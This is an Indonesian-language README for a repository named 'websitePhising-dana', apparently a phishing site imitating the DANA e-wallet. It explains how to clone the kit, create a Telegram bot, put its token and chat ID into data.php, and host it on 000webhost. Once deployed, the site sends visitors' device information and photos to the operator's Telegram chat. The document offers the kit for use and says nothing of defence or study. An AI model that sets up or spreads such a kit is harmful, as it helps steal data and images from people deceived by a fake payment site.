# 📦 Proyek Web PHP + Bot Telegram
Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan data (Informasi perangkat & file foto) ke Bot Telegram dan meneruskannya ke CHAT_ID yang ditentukan.

## 🔧 Kebutuhan
* Akun Telegram
* Bot Telegram (via BotFather)
* CHAT_ID tujuan

## 🛠️ Fitur
* Web berbasis PHP
* Mengirim data (teks, gambar, dll.) ke Bot Telegram
* Data diteruskan ke chat tertentu melalui CHAT_ID


# 🚀 Cara Menjalankan Proyek Ini
## 1. Clone atau Download Proyek
bash
`git clone https://github.com/tsaqifassajeed/websitePhising-dana.git\n`
`cd websitePhising-dana`

## 2. Buat Bot Telegram
Buka Telegram dan cari [https://t.me/Botfather]
Ketik /newbot dan ikuti petunjuk untuk membuat bot
Simpan TOKEN yang diberikan

## 3. Dapatkan CHAT_ID
Cari chat yang ingin menerima pesan (bisa chat pribadi atau grup)
Gunakan bot seperti https://t.me/userinfobot untuk melihat CHAT_ID
Jika dikirim ke grup, pastikan bot sudah ditambahkan ke grup dan gunakan API getUpdates untuk melihat chat.id

## 4. Edit File data.php
php
`<?php
$token = "ISI_DENGAN_TOKEN_BOT";
$chat_id = "ISI_DENGAN_CHAT_ID";
`
💡 Bisa dimodifikasi untuk mengirim foto, lokasi, dll.
## 5. Jalankan di Server Lokal (XAMPP/Laragon)
Letakkan proyek di folder htdocs (XAMPP) atau www (Laragon)
Jalankan server:
Buka browser: http://localhost/nama-folder-proyek/send.php
Cek Telegram — pesan akan muncul di chat!


# 🌐 Cara Deploy di 000webhost
## 1. Daftar & Login
Website: https://www.000webhost.com

## 2. Buat Website Baru
Klik Create New Website
Isi nama, password
Pilih Upload your own website

## 3. Upload index.php
Masuk File Manager → public_html
Upload file send.php ke sana

## 4. Akses dari browser:
bash
'https://namasitusmu.000webhostapp.com/index.php'
Maka pesan akan dikirim ke Telegram kamu!

Enjoy :)
